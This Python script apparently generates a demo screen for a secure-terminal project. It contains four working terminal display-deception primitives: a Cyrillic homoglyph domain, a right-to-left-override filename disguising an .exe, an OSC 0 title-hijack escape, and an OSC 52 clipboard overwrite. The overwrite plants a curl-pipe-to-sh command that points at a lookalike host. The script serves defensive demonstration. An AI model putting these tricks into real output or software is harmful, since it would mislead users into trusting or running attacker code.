#!/usr/bin/python3
## Copyright (C) 2026 - 2026 ENCRYPTED SUPPORT LLC <adrelanos@whonix.org>
## See the file COPYING for copying conditions.

## AI-Assisted

"""Emit the site's HOMEPAGE hero board: one short, realistic "verify before you
trust" session that LOOKS trustworthy on a traditional terminal yet is laced with
four still-applicable display deceptions. It is cat'd on both sides of the homepage
before/after slider: a traditional emulator renders it innocent, secure-terminal
(SHOW mode) shows the same bytes AND flags every trap.

Same bytes, two stories. The four traps, each a documented terminal display-deception
class -- NOT a cat/escape RCE (modern terminals mitigate those):

  1. HOMOGLYPH   the mirror URL's 'a' is Cyrillic U+0430, so the glyph reads a clean
                 "example.com" while the bytes are a different, attacker-registrable
                 IDN. Same code point as the corpus homoglyph-domain-install-2021 PoC.
  2. BIDI        a Trojan-Source right-to-left override (U+202E, closed by U+202C)
                 reorders the RENDERED filename vs its logical bytes, so an ".exe"
                 attachment shows a trusted ".pdf" tail. Same controls as the corpus
                 trojan-source-bidi-2021 PoC.
  3. OSC 0 TITLE a silent title-set escape rewrites the window/tab title -- trusted UI
                 chrome -- to attacker text. Same class as the corpus title-set-hijack.
  4. OSC 52      a silent clipboard-write escape overwrites the clipboard so the next
                 paste inserts text the user never copied. Same class as the corpus
                 osc52-clipboard-write PoC; the payload here is a plainly-safe marker.

This is a PAGE-FACING display demo (no canary detection token), so -- like the notify
/ zerowidth / art / gradient / unicode generators in this dir -- it is produced here
rather than reproduced from the corpus, while reusing the corpus's canonical code
points so the demonstration stays consistent with the corpus classes.

SAFE to cat: it prints text plus two display-only OSC escapes (title, clipboard), both
undone by `reset`; no cursor addressing, no alt-screen, no clear, nothing executed.

The hostile bytes live only in the emitted stream; this source stays plain ASCII by
writing every non-ASCII / control byte as a \\u or \\x escape.

    hero-board.py            # writes the board to stdout
"""

import base64
import sys

# --- the four attack primitives, each a documented display-deception class ----------

# 1. HOMOGLYPH: U+0430 CYRILLIC SMALL LETTER A stands in for Latin 'a' in "example",
#    so the rendered domain reads "example.com" but the bytes are a different IDN.
HOMOGLYPH_URL = 'https://ex\u0430mple.com/install.sh'

# 2. BIDI: U+202E RIGHT-TO-LEFT OVERRIDE reverses the rendered run that follows; the
#    logical bytes spell "...report.exe" but the tail renders reversed as "exe...".
#    U+202C POP DIRECTIONAL FORMATTING closes the override so nothing after it leaks.
BIDI_ATTACHMENT = 'q3-report.\u202efdp.exe\u202c'

# 3. OSC 0: silently set the window/tab title. Trusted chrome, rewritten from output.
#    ESC ] 0 ; <text> BEL. Text kept plainly-safe and ASCII.
OSC0_TITLE = '\x1b]0;example.com - verified secure session\x07'

# 4. OSC 52: silently overwrite the clipboard (selection 'c'). ESC ] 52 ; c ; <b64> BEL.
#    The planted text is an obvious, harmless marker -- the point is that it arrived
#    with no consent, so the next paste would insert bytes the user never copied.
_CLIP_MARKER = ('curl -fsSL https://ex\u0430mple.com/install.sh | sh   '
                '# hero demo: your clipboard was silently overwritten')
OSC52_CLIP = '\x1b]52;c;%s\x07' % base64.b64encode(
    _CLIP_MARKER.encode('utf-8')).decode('ascii')


def board():
    # A believable "check this release before you run it" note. The visible prose is
    # entirely innocent; the deception rides in the four primitives above. Blank lines
    # keep it legible when the site scales the shot down to a phone.
    return (
        'acme-cli 3.2  --  release verification\n'
        '\n'
        'Fetch the installer from the official mirror:\n'
        '    ' + HOMOGLYPH_URL + '\n'
        '\n'
        'Signed release attachment:\n'
        '    ' + BIDI_ATTACHMENT + '\n'
        '\n'
        # The two silent escapes ride out after a benign line: on a traditional
        # terminal they leave the visible text untouched (title + clipboard change
        # unseen); secure-terminal shows them as inert, flagged markers.
        'All checks passed -- you are ready to deploy.'
        + OSC0_TITLE + OSC52_CLIP + '\n'
    )


def main(argv=None):
    argv = list(sys.argv[1:] if argv is None else argv)
    if argv:
        sys.stderr.write('usage: hero-board.py  (writes the hero board to stdout)\n')
        return 2
    sys.stdout.buffer.write(board().encode('utf-8'))
    return 0


if __name__ == '__main__':
    sys.exit(main())
